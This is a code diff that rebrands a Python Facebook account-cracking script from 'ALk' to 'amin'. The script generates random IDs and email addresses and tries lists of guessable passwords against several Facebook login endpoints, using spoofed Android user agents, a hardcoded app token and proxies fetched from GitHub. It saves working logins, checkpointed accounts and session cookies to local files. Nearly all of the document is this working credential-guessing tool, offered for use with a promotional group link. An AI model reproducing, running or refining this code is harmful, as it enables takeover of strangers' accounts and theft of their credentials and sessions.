@@ -15,10 +15,10 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python ALk.py')
+	os.system('python amin.py')
 	
 print('[•] Join Our Group')
-os.system('xdg-open https://facebook.com/groups/1267077887495034/')
+os.system('xdg-open https://facebook.com/groups/100087608111086/')
 
 try:
 	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
@@ -57,7 +57,7 @@ for xd in range(10000):
 	l='Mobile Safari/537.36'
 	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
-for agent in range(10000):
+for agent in range(20000):
 	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
 	b=random.choice(['6','7','8','9','10','11','12','13'])
 	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
@@ -289,7 +289,7 @@ def menu():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python ALk.py')
+				os.system('python amin.py')
 			elif xd in ['2','02']:
 				pak()
 			elif xd in ['3','03']:
@@ -325,7 +325,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as ALk:	
+		with tred(max_workers=30) as amin:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -351,24 +351,24 @@ def pak():
 				elif pcs in ['8','08']:
 					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
 				if mthd in ['1','01']:
-					ALk.submit(ALk1,ids,passlist)
+					amin.submit(amin1,ids,passlist)
 				if mthd in ['2','02']:
-					ALk.submit(ALk2,ids,passlist)
+					amin.submit(amin2,ids,passlist)
 				if mthd in ['3','03']:
-					ALk.submit(ALk3,ids,passlist)
+					amin.submit(amin3,ids,passlist)
 				if mthd in ['4','04']:
-					ALk.submit(ALk4,ids,passlist)
+					amin.submit(amin4,ids,passlist)
 				if mthd in ['5','05']:
-					ALk.submit(ALk5,ids,passlist)
+					amin.submit(amin5,ids,passlist)
 				if mthd in ['6','06']:
-					ALk.submit(ALk6,ids,passlist)
+					amin.submit(amin6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python ALk.py')
+		os.system('python amin.py')
 
 def gmail():
 		os.system('rm -rf .re.txt')
@@ -409,7 +409,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as ALk:
+		with tred(max_workers=30) as amin:
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -433,30 +433,30 @@ def gmail():
 				else:
 					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
 				if mthd in ['1','01']:
-					ALk.submit(ALk1,ids,passlist)
+					amin.submit(amin1,ids,passlist)
 				if mthd in ['2','02']:
-					ALk.submit(ALk2,ids,passlist)
+					amin.submit(amin2,ids,passlist)
 				if mthd in ['3','03']:
-					ALk.submit(ALk3,ids,passlist)
+					amin.submit(amin3,ids,passlist)
 				if mthd in ['4','04']:
-					ALk.submit(ALk4,ids,passlist)
+					amin.submit(amin4,ids,passlist)
 				if mthd in ['5','05']:
-					ALk.submit(ALk5,ids,passlist)
+					amin.submit(amin5,ids,passlist)
 				if mthd in ['6','06']:
-					ALk.submit(ALk6,ids,passlist)
+					amin.submit(amin6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python ALk.py')
+		os.system('python amin.py')
 #b-api method
 #1method
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [ALk-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [amin-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -521,18 +521,18 @@ def api1(ids,names,passlist):
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [ALk-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/ALk-OK.txt','a').write(ids+'|'+pas+'\n')
+					print('\r\r\033[1;32m [amin-OK] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/amin-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
-						open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+						open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
 						break
 				else:
 					continue
@@ -546,7 +546,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [ALk-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [amin-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -594,26 +594,26 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ALk-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [amin-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/ALk-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ALk-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/amin-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/amin-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[ALk-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[amin-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -625,7 +625,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [ALk-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [amin-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -693,26 +693,26 @@ def api3(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ALk-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [amin-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/ALk-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/ALk-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/amin-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/amin-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[ALk-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[amin-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -725,7 +725,7 @@ def api3(ids,names,passlist):
 def api4(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [ALk-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [amin-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -794,23 +794,23 @@ def api4(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ALk-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALk-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [amin-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/amin-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[ALk-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[amin-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -822,7 +822,7 @@ def api4(ids,names,passlist):
 def api5(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [ALk-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [amin-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -910,26 +910,26 @@ def api5(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ALk-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [amin-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/ALk-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ALk-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/amin-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/amin-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[ALk-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[amin-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/ALk-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/amin-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -939,7 +939,7 @@ def api5(ids,names,passlist):
                 pass
 def api6(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [ALk-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [amin-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -956,18 +956,18 @@ def api6(ids,names,passlist):
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			ALk=session.cookies.get_dict().keys()
-			if "c_user" in ALk:
+			amin=session.cookies.get_dict().keys()
+			if "c_user" in amin:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [ALk-OK] %s | %s'%(ids,pas))
-				open('/sdcard/ALk-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [amin-OK] %s | %s'%(ids,pas))
+				open('/sdcard/amin-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in ALk:
+			elif 'checkpoint' in amin:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/ALk-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/amin-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -981,7 +981,7 @@ def api6(ids,names,passlist):
 #d.fb
 def api7(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [ALk-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [amin-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -998,18 +998,18 @@ def api7(ids,names,passlist):
 			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			ALk=session.cookies.get_dict().keys()
-			if "c_user" in ALk:
+			amin=session.cookies.get_dict().keys()
+			if "c_user" in amin:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [ALk-OK] %s | %s'%(ids,pas))
-				open('/sdcard/ALk-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [amin-OK] %s | %s'%(ids,pas))
+				open('/sdcard/amin-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in ALk:
+			elif 'checkpoint' in amin:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/ALk-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/amin-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1022,7 +1022,7 @@ def api7(ids,names,passlist):
 #method7
 def api8(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [ALk-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [amin-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1039,18 +1039,18 @@ def api8(ids,names,passlist):
 			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			ALk=session.cookies.get_dict().keys()
-			if "c_user" in ALk:
+			amin=session.cookies.get_dict().keys()
+			if "c_user" in amin:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [ALk-OK] %s | %s'%(ids,pas))
-				open('/sdcard/ALk-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [amin-OK] %s | %s'%(ids,pas))
+				open('/sdcard/amin-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in ALk:
+			elif 'checkpoint' in amin:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/ALk-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/amin-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1061,10 +1061,10 @@ def api8(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 #method1rnd
-def ALk1(ids,passlist):
+def amin1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [ALk-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [amin-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1148,8 +1148,8 @@ def ALk1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ALk-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALk-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [amin-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/amin-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1159,8 +1159,8 @@ def ALk1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [ALk-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALk-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [amin-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/amin-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1168,12 +1168,12 @@ def ALk1(ids,passlist):
         except Exception as e:
                 pass
 
-def ALk2(ids,passlist):
+def amin2(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [ALk-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [amin-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
 			application_version_code=str(random.randint(000000000,999999999))
 			__iam_genius = random.choice(android_models)
@@ -1229,13 +1229,13 @@ def ALk2(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [ALk-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/ALk-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				print('\r\r\033[1;32m [amin-OK] '+udx+' | '+pas+'\033[1;97m')
+				open('/sdcard/amin-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;205m [ALk-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/ALk-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\x1b[38;5;205m [amin-CP] '+ids+' | '+pas+'\033[1;97m')
+				open('/sdcard/amin-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -1247,10 +1247,10 @@ def ALk2(ids,passlist):
 		print(e)
 #new method
                 
-def ALk3(ids,passlist):
+def amin3(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [ALk-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [amin-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1323,11 +1323,11 @@ def ALk3(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ALk-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [amin-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        #open('/sdcard/ALk-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ALk-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        #open('/sdcard/amin-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/amin-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1337,8 +1337,8 @@ def ALk3(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [ALk-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALk-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [amin-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/amin-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1346,10 +1346,10 @@ def ALk3(ids,passlist):
         except Exception as e:
                 pass
 #method4
-def ALk4(ids,passlist):
+def amin4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [ALk-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [amin-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1418,11 +1418,11 @@ def ALk4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ALk-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [amin-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/ALk-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/ALk-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/amin-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/amin-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1432,8 +1432,8 @@ def ALk4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [ALk-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALk-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [amin-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/amin-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1441,10 +1441,10 @@ def ALk4(ids,passlist):
         except Exception as e:
                 pass
 #method5
-def ALk5(ids,passlist):
+def amin5(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [ALk-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [amin-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1513,8 +1513,8 @@ def ALk5(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ALk-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALk-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [amin-OK] '+str(uid)+' | '+pas+'\033[1;97m')
